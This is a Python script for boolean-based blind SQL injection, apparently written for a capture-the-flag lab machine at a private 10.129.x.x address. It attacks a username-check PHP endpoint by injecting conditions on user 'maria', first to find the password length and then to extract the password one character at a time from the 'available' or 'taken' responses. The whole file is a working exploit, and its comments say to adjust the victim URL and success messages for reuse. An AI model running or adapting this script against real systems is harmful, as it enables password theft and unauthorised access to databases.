#!/usr/bin/python3
import httplib2, string, urllib.parse

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits
#Adjust to the victim URL
URL = "http://10.129.174.49/api/check-username.php?u="
http = httplib2.Http()

#Adjust if you need bigger, first find the passwd lenght
for i in range(50): 
    #Adjust the URL encoded params in the body
    params = "maria' AND LEN(password)>%s-- -" %(i) 
    send = http.request(str(URL+params))[1]
    #Adjust the success message, in this case since maria=always true the other condition must be false in other to get FALSE=taken and stop the cycle 
    if ("available" in send.decode()): 
        l = i 
        break 
print("[+] Password length: " + str(l)) 

#Substring extract 
for i in range(1, l + 1):
    #Use ASCII values for better matching 
    for al in range(32,127):
        #Adjust the URL encoded params in the body
        params = "maria' AND ASCII(SUBSTRING(password,%s,1))=%s-- -" %(i,al)
        send = http.request(str(URL+params))[1]
        #Adjust the success message, in this case will be taken when both condition are TRUE as Maria exist and is always true and second will get true if the char=al
        if ("taken" in send.decode()): 
            flag += chr(al)
            print("[+] Flag: " + flag) 
            break

